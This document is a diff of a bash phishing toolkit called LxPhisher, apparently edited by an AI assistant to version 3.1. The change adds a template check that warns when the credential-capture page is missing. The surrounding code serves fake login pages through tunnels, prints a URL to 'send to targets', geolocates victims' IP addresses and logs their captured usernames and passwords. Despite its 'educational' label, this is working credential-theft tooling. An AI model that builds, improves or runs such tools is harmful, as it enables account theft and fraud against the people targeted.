@@ -2,7 +2,7 @@
 
 # ==================================================
 # LxPhisher - Advanced Phishing Toolkit
-# Version: 3.0
+# Version: 3.1
 # Author: Voltsparx
 # License: MIT (For Educational Purposes Only)
 # Menu Enhancement by: AI Assistant
@@ -42,7 +42,7 @@ show_header() {
     echo "|_____/_/\_\_|   |_| |_|_|___/_| |_|\___|_|   "
     echo -e "${NC}"
     echo -e "        ${CYAN}Advanced Phishing Simulation Toolkit${NC}"
-    echo -e "         ${GREEN}v3.0 - By Voltsparx${NC}"
+    echo -e "         ${GREEN}v3.1 - By Voltsparx${NC}"
     echo -e "        ${YELLOW}Contact: voltsparx@gmail.com${NC}"
     echo -e "           ${RED}<< For Educational Use Only >>${NC}"
     echo "================================================"
@@ -66,7 +66,7 @@ install_tunnelers() {
     echo -e "\n${GREEN}[+]${CYAN} Checking and installing tunnelers...${NC}"
     
     # Cloudflared
-    if [ ! -f ".tunnels/cloudflared" ]; then
+    if [ ! -f ".tunnels/cloudflared-bin" ]; then
         echo -e "${YELLOW}[i] Installing Cloudflared...${NC}"
         arch=$(uname -m)
         case $arch in
@@ -345,16 +345,33 @@ start_localhostrun() {
     fi
 }
 
+# Validate template files before starting server
+validate_template() {
+    local template="$1"
+    local dir="templates/$template"
+    if [ ! -d "$dir" ]; then
+        echo -e "${RED}[!] Template directory not found: $dir${NC}"
+        return 1
+    fi
+    if [ ! -f "$dir/index.php" ] && [ ! -f "$dir/index.html" ]; then
+        echo -e "${RED}[!] Template missing index file (index.php or index.html)${NC}"
+        return 1
+    fi
+    if [ ! -f "$dir/login.php" ]; then
+        echo -e "${YELLOW}[!] Warning: login.php missing. Credential capture may not work.${NC}"
+        sleep 2
+    fi
+    return 0
+}
+
 # Start server
 start_server() {
     template=$1
     echo -e "\n${GREEN}[+]${CYAN} Starting PHP server...${NC}"
-    
     pkill -f "php -S" 2>/dev/null
     SERVER_DIR="servers/$template"
     rm -rf "$SERVER_DIR" 2>/dev/null
     cp -r "templates/$template" "$SERVER_DIR"
-    
     cd "$SERVER_DIR"
     php -S $HOST:$PORT > /dev/null 2>&1 &
     cd - > /dev/null
@@ -365,7 +382,6 @@ start_server() {
 get_geolocation() {
     local ip=$1
     local geo_data=$(curl -s "http://ip-api.com/json/$ip")
-    
     echo "Latitude: $(echo $geo_data | jq -r '.lat // "N/A"')"
     echo "Longitude: $(echo $geo_data | jq -r '.lon // "N/A"')"
     echo "City: $(echo $geo_data | jq -r '.city // "N/A"')"
@@ -381,50 +397,34 @@ monitor_victims() {
     echo -e "${YELLOW}[i] Send this URL to targets: ${TUNNEL_URL}${NC}"
     echo -e "${YELLOW}[i] Masked URL: ${MASK_URL}${NC}"
     echo -e "${YELLOW}[i] Press Ctrl+C to stop monitoring${NC}"
-    
     local credentials_file="captured_data/credentials_${TEMPLATE_NAME}_$(date +%Y%m%d_%H%M%S).log"
-    
-    # Clear previous data
     rm -f "$SERVER_DIR/usernames.txt" "$SERVER_DIR/ip.txt" 2>/dev/null
-    
     while true; do
-        # Check for new victim
         if [ -f "$SERVER_DIR/ip.txt" ]; then
             local victim_ip=$(cat "$SERVER_DIR/ip.txt")
             echo -e "\n${GREEN}[+]${GREEN} 🎯 VICTIM CONNECTED!${NC}"
             echo -e "${CYAN}IP Address: ${victim_ip}${NC}"
             echo -e "${CYAN}Timestamp: $(date)${NC}"
-            
-            # Get and display geolocation
             echo -e "\n${YELLOW}📍 Geolocation Data:${NC}"
             get_geolocation "$victim_ip"
-            
-            # Save to log file
             echo "=== VICTIM CONNECTED ===" >> "$credentials_file"
             echo "Timestamp: $(date)" >> "$credentials_file"
             echo "IP Address: $victim_ip" >> "$credentials_file"
             echo "Template: $TEMPLATE_NAME" >> "$credentials_file"
             get_geolocation "$victim_ip" >> "$credentials_file"
             echo "========================" >> "$credentials_file"
-            
             rm -f "$SERVER_DIR/ip.txt"
         fi
-        
-        # Check for credentials
         if [ -f "$SERVER_DIR/usernames.txt" ]; then
             echo -e "\n${RED}[+]${RED} 🔐 CREDENTIALS CAPTURED!${NC}"
             echo -e "${RED}=== CAPTURED DATA ===${NC}"
             cat "$SERVER_DIR/usernames.txt"
             echo -e "${RED}=====================${NC}"
-            
-            # Save to log file
             echo "=== CREDENTIALS CAPTURED ===" >> "$credentials_file"
             cat "$SERVER_DIR/usernames.txt" >> "$credentials_file"
             echo "===========================" >> "$credentials_file"
-            
             rm -f "$SERVER_DIR/usernames.txt"
         fi
-        
         sleep 1
     done
 }
@@ -435,13 +435,11 @@ view_captured_data() {
     show_header
     echo -e "${GREEN}[+]${CYAN} Captured Data:${NC}"
     echo ""
-    
     if [ -d "captured_data" ] && [ -n "$(ls -A captured_data 2>/dev/null)" ]; then
         echo -e "${YELLOW}Available credential files:${NC}"
         ls -la captured_data/
         echo ""
         read -p "$(echo -e "${GREEN}[+]${CYAN} Enter filename to view (or press Enter to return): ${NC}")" data_file
-        
         if [ -n "$data_file" ] && [ -f "captured_data/$data_file" ]; then
             echo -e "\n${YELLOW}Contents of $data_file:${NC}"
             echo "=========================================="
@@ -501,11 +499,9 @@ show_main_menu() {
 main() {
     show_header
     check_deps
-    
     while true; do
         show_main_menu
         read -p "$(echo -e "${GREEN}[+]${CYAN} Select an option: ${NC}")" choice
-        
         case $choice in
             0) 
                 echo -e "${GREEN}[+] Goodbye!${NC}"
@@ -516,7 +512,6 @@ main() {
                 while true; do
                     show_template_menu
                     read -p "$(echo -e "${GREEN}[+]${CYAN} Select a template (98 to go back): ${NC}")" template_choice
-                    
                     case $template_choice in
                         98) break ;;
                         00) 
@@ -536,7 +531,6 @@ main() {
                                 sleep 1
                                 continue
                             fi
-                            
                             if [ "$TEMPLATE_NAME" = "custom" ]; then
                                 read -p "$(echo -e "${GREEN}[+]${CYAN} Enter custom template path: ${NC}")" custom_path
                                 if [ -d "$custom_path" ]; then
@@ -547,13 +541,10 @@ main() {
                                     continue
                                 fi
                             fi
-                            
-                            if [ ! -d "templates/$TEMPLATE_NAME" ]; then
-                                echo -e "${RED}[!] Template not found: $TEMPLATE_NAME${NC}"
-                                sleep 1
+                            if ! validate_template "$TEMPLATE_NAME"; then
+                                sleep 2
                                 continue
                             fi
-                            
                             if select_port; then
                                 mask_url
                                 if select_tunnel; then
